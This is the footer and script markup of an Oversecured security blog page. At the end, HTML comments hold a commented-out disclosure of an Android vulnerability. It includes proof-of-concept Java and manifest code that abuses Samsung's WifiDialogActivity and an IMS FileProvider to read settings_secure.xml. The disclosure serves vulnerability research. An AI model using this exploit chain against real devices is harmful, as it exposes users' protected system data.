                    <a href="https://oversecured.com/" target="_blank" rel="noopener">Oversecured.com</a> ·
                    <a href="https://oversecured.com/pricing" target="_blank" rel="noopener">Pricing</a> ·
                    <a href="https://oversecured.com/about" target="_blank" rel="noopener">About</a>
                </section>
                <section class="poweredby">
<!--                    <a href="https://jekyllrb.com/">Jekyll</a> &-->
<!--                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using-->
<!--                    <a href="https://github.com/jekyller/jasper2" target="_blank" rel="noopener">Jasper2</a></section>-->
                </section>
                <nav class="site-footer-nav">
					<a style="display: inline; padding: 0; margin-right: 10px" class="social-link" href="https://linkedin.com/company/Oversecured/" target="_blank" rel="noopener"><?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" id="Linkedin" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px"
	y="0px" viewBox="0 0 32 32" style="enable-background:new 0 0 32 32;" xml:space="preserve">
	<path id="frame" d="M0.72,16.01c0-3.89,0-7.77,0-11.66c0-1.66,1.08-3.06,2.68-3.46c0.29-0.07,0.59-0.11,0.89-0.11
	c7.75-0.01,15.5-0.01,23.24,0c2.01,0,3.58,1.56,3.58,3.56c0,7.76,0,15.52,0,23.28c0,1.98-1.57,3.55-3.55,3.55
	c-7.76,0-15.52,0-23.28,0c-2,0-3.55-1.55-3.56-3.54C0.71,23.76,0.72,19.89,0.72,16.01C0.72,16.01,0.72,16.01,0.72,16.01z
	 M28.74,15.98C28.73,15.98,28.73,15.98,28.74,15.98c0-3.81,0-7.62,0-11.42c0-0.97-0.43-1.39-1.41-1.4c-7.64,0-15.27,0-22.91,0
	c-0.87,0-1.34,0.47-1.34,1.34c0,7.64,0,15.27,0,22.91c0,0.95,0.45,1.4,1.41,1.4c3.15,0,6.3,0,9.46,0c4.48,0,8.97,0,13.45,0
	c0.41,0,0.77-0.1,1.04-0.42c0.26-0.3,0.29-0.66,0.29-1.03C28.73,23.57,28.74,19.78,28.74,15.98z" />
	<path id="n" d="M16.86,25.89c-1.37,0-2.69,0-4.02,0c0-4.47,0-8.92,0-13.39c1.34,0,2.67,0,4.02,0c0,0.57,0,1.12,0,1.75
	c0.16-0.21,0.26-0.36,0.38-0.5c0.79-0.92,1.82-1.36,3-1.48c0.89-0.09,1.78-0.02,2.63,0.26c1.51,0.48,2.3,1.6,2.62,3.08
	c0.14,0.65,0.24,1.32,0.25,1.98c0.03,2.75,0.01,5.51,0.01,8.29c-1.34,0-2.69,0-4.09,0c0-0.12,0-0.25,0-0.38
	c-0.01-2.35,0.01-4.71-0.03-7.06c-0.01-0.53-0.16-1.08-0.34-1.58c-0.22-0.59-0.71-0.92-1.34-1.02c-1.72-0.27-2.91,0.66-3.02,2.47
	c-0.08,1.29-0.06,2.6-0.07,3.89c-0.01,1.09,0,2.18,0,3.26C16.86,25.6,16.86,25.74,16.86,25.89z" />
	<path id="i_1_" d="M10.18,25.9c-1.38,0-2.73,0-4.1,0c0-4.46,0-8.92,0-13.4c1.36,0,2.72,0,4.1,0C10.18,16.96,10.18,21.41,10.18,25.9z
	" />
	<path id="i" d="M5.76,8.16c0.04-1.37,1.13-2.41,2.52-2.38c1.32,0.03,2.4,1.16,2.36,2.48c-0.04,1.36-1.14,2.42-2.49,2.39
	C6.8,10.62,5.72,9.49,5.76,8.16z" />
</svg></a>
                    <a style="display: inline; padding: 0" class="social-link social-link-tw" href="https://twitter.com/OversecuredInc" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a>
<!--                    -->
<!--                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>-->
                </nav>
            </div>
        </footer>
    </div>

    <!-- The big email subscribe modal content -->
    

    <!-- highlight.js -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script
        src="https://code.jquery.com/jquery-3.2.1.min.js"
        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->
<!--    <script type="text/javascript">-->
<!--        const cross = document.querySelector('.link-to-oversecured__cross')-->
<!--        console.log(cross)-->
<!--        console.log('12323')-->
<!--    </script>-->

    


    <!-- Add Google Analytics  -->
    <!-- Google Analytics Tracking code -->
 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-171786448-1', 'auto');
  ga('send', 'pageview');

 </script>


    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        const noticeToggle = sessionStorage.getItem('notice')
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        header.style.top = '0'

        // if (window.scrollY > 15 || noticeToggle === false) {
        //     header.style.top = '0'
        // } else if (window.scrollY < 15 && noticeToggle === null) {
        //     header.style.top = '35px'
        // }

        // show/hide floating header
        // if (lastScrollY >= trigger + triggerOffset) {
        //     header.classList.add('floating-active');
        // } else {
        //     header.classList.remove('floating-active');
        // }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->
    <div class="gdpr-notice">
        <p class="gdpr-notice__text">This website uses cookies to improve your experience. See our <a class="gdpr-notice__link" href="https://oversecured.com/privacy" target="_blank">Privacy Policy</a> to learn more.</p>
        <button class="gdpr-notice__btn-accept">Accept</button>
    </div>

    <script src="/assets/js/toggleHeaderNotice.js"></script>
    <script src="/assets/js/gdprNoticeToggle.js"></script>
    <script src="/assets/anchorjs-4.3.1/anchor.min.js"></script>

    <script>
        const addAnchorsToHeadings = () => {
            anchors.options.visible = 'visible';
            anchors.options.ariaLabel = 'h1';
            anchors.options.placement = 'left';
            anchors.options.icon = '#';
            anchors.options.class = 'anchor-item';
            anchors.add('.heading-anchor');
        }

        addAnchorsToHeadings()
    </script>

<!--todo-->
<!--[comment]: <> ([Output from Oversecured's vulnerability scanner]&#40;#output-from-oversecured’s-vulnerability-scanner&#41;)-->

<!--[comment]: <> ({:.heading-anchor})-->

<!--[comment]: <> (- For SecSettings)-->

<!--[comment]: <> (<img class="post-template__vulnearbility-image" src="/assets/images/SecSettings.png" alt="vulnerability"/>)-->

<!--[comment]: <> (- For an unsafe FileProvider in `com.sec.imsservice`:)-->

<!--[comment]: <> (<img class="post-template__vulnearbility-image" src="/assets/images/imsservice.png" alt="vulnerability"/>)-->

<!--[comment]: <> ([Steps followed to exploit this vulnerability:]&#40;#steps-followed-to-exploit-this-vulnerability&#41;)-->

<!--[comment]: <> ({:.heading-anchor})-->

<!--[comment]: <> (1. The activity `com.android.settings.wifi.WifiDialogActivity` is exported &#40;however, it does request the sender to enable the `android.permission.CHANGE_WIFI_STATE` permission&#41;.)-->

<!--[comment]: <> (2. It launches an implicit intent and passes the activity result to its own `setResult&#40;code, attacker_controlled_intent&#41;`.)-->

<!--[comment]: <> (3. When the victim clicks on "Add network" -> "QR scan" and selects the attacker's app, the app will get read/write access to arbitrary system files.)-->

<!--[comment]: <> (The attack looks like this:)-->

<!--[comment]: <> (1. Launching an activity to add a network)-->

<!--[comment]: <> (File `AndroidManifest.xml`)-->

<!--[comment]: <> (```xml)-->

<!--[comment]: <> (<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />)-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (File `MainActivity.java`)-->

<!--[comment]: <> (```java)-->

<!--[comment]: <> (protected void onCreate&#40;Bundle savedInstanceState&#41; {)-->

<!--[comment]: <> (   super.onCreate&#40;savedInstanceState&#41;;)-->

<!--[comment]: <> (   Intent i = new Intent&#40;&#41;;)-->

<!--[comment]: <> (   i.setClassName&#40;"com.android.settings", "com.android.settings.wifi.WifiDialogActivity"&#41;;)-->

<!--[comment]: <> (   startActivityForResult&#40;i, 0&#41;;)-->

<!--[comment]: <> (})-->

<!--[comment]: <> (protected void onActivityResult&#40;int requestCode, int resultCode, Intent data&#41; {)-->

<!--[comment]: <> (   super.onActivityResult&#40;requestCode, resultCode, data&#41;;)-->

<!--[comment]: <> (   try {)-->

<!--[comment]: <> (       Log.d&#40;"evil", IOUtils.toString&#40;getContentResolver&#40;&#41;.openInputStream&#40;data.getData&#40;&#41;&#41;&#41;&#41;;)-->

<!--[comment]: <> (   } catch &#40;Throwable th&#41; {)-->

<!--[comment]: <> (       throw new RuntimeException&#40;th&#41;;)-->

<!--[comment]: <> (   })-->

<!--[comment]: <> (})-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (2. Returning an attacker-controlled intent)-->

<!--[comment]: <> (File `AndroidManifest.xml`)-->

<!--[comment]: <> (```xml)-->

<!--[comment]: <> (<activity android:name=".PickerActivity">)-->

<!--    [comment]: <> (   <intent-filter android:autoVerify="true" android:priority="999">)-->

<!--        [comment]: <> (       <action android:name="android.settings.WIFI_DPP_ENROLLEE_QR_CODE_SCANNER" />)-->

<!--        [comment]: <> (       <category android:name="android.intent.category.DEFAULT" />)-->

<!--        [comment]: <> (   </intent-filter>)-->

<!--    [comment]: <> (</activity>)-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (File `PickerActivity.java`)-->

<!--[comment]: <> (```java)-->

<!--[comment]: <> (protected void onCreate&#40;Bundle savedInstanceState&#41; {)-->

<!--[comment]: <> (   super.onCreate&#40;savedInstanceState&#41;;)-->

<!--[comment]: <> (   Intent i = new Intent&#40;"evil"&#41;;)-->

<!--[comment]: <> (   i.setData&#40;Uri.parse&#40;"content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"&#41;&#41;;)-->

<!--[comment]: <> (   i.setFlags&#40;Intent.FLAG_GRANT_READ_URI_PERMISSION&#41;;)-->

<!--[comment]: <> (   setResult&#40;-1, i&#41;;)-->

<!--[comment]: <> (   finish&#40;&#41;;)-->

<!--[comment]: <> (})-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (As a result, the content of the file `/data/system/users/0/settings_secure.xml` appeared in the logs.)-->

<!--[comment]: <> ({:.markdown-in-single-quotes})-->
</body>
</html>
